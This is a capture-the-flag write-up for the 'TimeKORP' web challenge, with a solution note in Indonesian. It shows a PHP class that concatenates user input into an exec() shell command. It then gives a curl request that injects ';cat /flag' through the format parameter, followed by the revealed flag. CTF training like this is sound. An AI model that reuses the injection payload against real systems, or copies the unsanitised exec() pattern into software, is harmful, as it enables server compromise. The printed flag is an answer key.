<h1>TimeKORP</h1>
<h3>Description</h3>
<pre>
Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.
</pre>
<h3>Solution</h3>
<label>Ada kerentanan tanpa filter di models/TimeModel.php pada fungsi exec()</label>

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

```console
┌──(root㉿Kali)-[/home/venom/Payload_CTF/Web]
└─# curl -X GET "http://154.57.164.73:31056/?format=';cat%20/flag'" | grep -o 'HTB{[^}]*}'
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1974   0   1974   0      0   5463      0                              0
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_0b8f6f34dc595644b3c8ed6569ae92f8}
```
<h3>Flag</h3>
<pre>
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_0b8f6f34dc595644b3c8ed6569ae92f8}
</pre>
